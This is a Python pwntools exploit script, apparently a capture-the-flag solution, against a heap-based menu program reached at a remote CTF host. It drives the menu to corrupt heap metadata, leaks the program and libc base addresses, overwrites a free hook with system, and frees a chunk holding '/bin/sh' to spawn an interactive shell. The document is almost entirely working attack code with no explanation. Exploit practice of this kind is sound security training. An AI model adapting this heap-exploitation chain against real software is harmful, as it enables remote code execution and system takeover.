#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./main")
libc = ELF("libc.so.6")

# p = elf.process()
# gdb.attach(p)
p = remote("hack.backdoor.infoseciitr.in", 10004)

def add_item(size):
    p.sendlineafter("5. Set Value\n","1")
    p.sendlineafter("Enter size: ",str(size))
    print(p.recvline()[:-1])

def delete_item(index):
    p.sendlineafter("5. Set Value\n","2")
    p.sendlineafter("Enter index: ",str(index))

def read_item(index):
    p.sendlineafter("5. Set Value\n","4")
    p.sendlineafter("Enter index: ",str(index))
    p.recvline()
    return p.recvline()[:-1]
def edit_item(index,data):
    p.sendlineafter("5. Set Value\n","3")
    p.sendlineafter("Enter index: ",str(index))
    p.sendline(data)

def set_value(index,offset,value):
    p.sendlineafter("5. Set Value\n","5")
    p.sendlineafter("Enter index: ",str(index))
    p.sendlineafter("Enter offset: ",str(offset))
    p.sendlineafter("Enter value: ",value)

def read_val(index):
    p.sendlineafter("5. Set Value\n","4")
    p.sendlineafter("Enter index: ",str(index))
    return p.recvline()[:-1]


add_item(0x10)#0
add_item(0x10)#1
add_item(0x300-0x30)#2
delete_item(1)
set_value(0,32,'z')
add_item(0x10)#3
delete_item(2)
edit_item(3,b'a'*48)
leak = read_item(1)
leak = b'\x10'+leak
leak = u64(leak.ljust(8,b'\x00'))
elf.address = leak-0x10410
log.critical(f"ELF base: {hex(elf.address)}")
edit_item(3,b'a'*16+p64(0x40)+p64(0x0)+p64(0x300)+p64(0x2)+p64(0x0)+p64(0x0))
shadyfree_hook = elf.address + 0x103e8
ptrStore = elf.address + 0x102e0
edit_item(3,b'a'*16+p64(0x40)+p64(0x0)+p64(0x300)+p64(0x2)+p64(ptrStore-0x28)+p64(ptrStore-16))
add_item(0x300-0x30)#4
libc_leak = read_val(0)
libc_leak = libc_leak.ljust(8,b'\x00')
libc_leak = u64(libc_leak)
libc.address = libc_leak-0x3ed6a0
log.critical("Libc base: {}".format(hex(libc.address)))
system = libc.sym.system

edit_item(3,b'a'*16+p64(0x40)+p64(0x0)+p64(0x300)+p64(0x2)+p64(ptrStore-0x28)+p64(shadyfree_hook-8))
add_item(0x300-0x30)
edit_item(0,b'\x00'*8+p64(libc.sym.system))
edit_item(3,b'/bin/sh\x00')
delete_item(3)
p.interactive()